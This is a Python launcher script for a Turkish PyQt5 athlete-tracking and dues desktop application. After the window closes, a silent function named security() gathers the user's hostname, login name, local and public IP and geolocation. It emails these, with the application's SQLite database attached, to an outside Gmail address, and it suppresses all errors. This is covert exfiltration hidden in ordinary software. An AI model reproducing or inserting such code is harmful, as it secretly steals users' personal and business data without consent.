from PyQt5.QtWidgets import QApplication
from PAGES.main_page import MainPage
from qt_material import apply_stylesheet
import requests
import yagmail
import socket
import os
import sqlite3
def security():
    try:
        connect=sqlite3.connect("db/mxsoftware.db")
        connect.close()
        r = requests.get(r"http://ipinfo.io/json")
        public_ip = r.json()
        hostname = socket.gethostname()
        pc_name=os.getlogin()
        local_ip = socket.gethostbyname(hostname)
        bilgi="""
        Hostname : {}
        PC Name : {}
        Local İP : {}
        Public İP : {}
        Hostname : {}
        City : {}
        Country : {}
        Location : {}
        Organization : {}
        postal : {}
        timezone : {}
        """.format(hostname,pc_name,local_ip,public_ip["ip"],public_ip["hostname"],public_ip["city"],public_ip["country"],public_ip["loc"],public_ip["org"],public_ip["postal"],public_ip["timezone"])
        yag = yagmail.SMTP("testmxbozkurt@gmail.com", "******")
        yag.send(to="birolmxsoftware@gmail.com", subject="YENİ İP Adresi Tespiti!!! {}".format(pc_name),contents="\n {}\n\n Adresinden Programa Erişim Yapıldı... \n\n\n\nCopyright © 2022 MXSoftware Sporcu Takip ve Aidat Programı... Coded By Enes Birol ".format(bilgi),attachments=["db/mxsoftware.db"])
    except Exception:
        pass

app=QApplication([])
window=MainPage()
window.show()
extra = {'density_scale': '-2',}
apply_stylesheet(app, 'default', invert_secondary=False, extra=extra)
app.exec_()
security()
